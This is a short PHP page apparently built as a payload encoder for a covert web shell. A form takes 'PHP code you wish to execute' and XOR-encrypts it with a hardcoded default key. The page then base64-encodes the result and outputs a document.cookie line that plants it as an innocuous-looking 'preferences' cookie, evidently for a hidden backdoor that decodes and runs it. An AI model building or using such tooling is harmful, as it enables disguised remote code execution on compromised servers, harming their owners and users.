<?php

function encrypt($key, $data)
{
  $index = 0;
  $output = "";
  $datalen = strlen($data);
  $keylen = strlen($key);
  if (($datalen == 0) || ($keylen == 0)) { return Null;}
  while ($index < $datalen) {
    if ($index + $keylen < $datalen) {
      $chunk = substr($data, $index, $keylen);

      $output = $output . ($chunk ^ $key);
      $index = $index + $keylen;
    } else {
      $chunk = substr($data, $index, $datalen);

      $key = substr($key, 0, $datalen - $index);
      $output = $output . ($chunk ^ $key);
      $index = $index + $keylen;
    }
  }
  return $output;
}

$key = "Ihatebeets";
if(isset($_GET["key"]) && strlen($_GET["key"] > 0)) {
  $key = $_GET["key"];
}

$data = "";
if(isset($_GET["data"]) && strlen($_GET["data"]) > 0) {
  $data = $_GET["data"];
}

$encodedInput = "";
if ($data != "") {
  $encodedInput = base64_encode(encrypt($key, stripslashes($data)));
}

?>

<!DOCTYPE html>
<html>
<head>
<title>Encrypter</title>
<meta charset="UTF-8">
<style>
div.row {
  width: 75%;
  margin-right: auto;
  margin-left: auto;
  padding: 15px;
}

label {
  margin-bottom: 5px;
}
form div.row label,
form div.row input {
  display: inline-block;
}

input[type=text] {
  width: 100%;
}

pre {
padding: 10px;
  background-color: #eee;
}
</style>
</head>
<body>

<form method="GET">
  <div class="row">
  <label>Key (optional)</label>
  <input type="text" name="key" />
  </div>

  <div class="row">
  <label>PHP code you wish to execute?</label>
  <input type="text" required name="data" />
  </div>
  
  <div class="row">
  <input type="submit" name="Submit" />
  </div>
</form>
<?php
  if ($encodedInput != "") {
    $output = <<<EOT
<div class="row">
<pre>
document.cookie="preferences=$encodedInput"
</pre>
</div>
EOT;
    print $output;
  }
?>

</body>
</html>
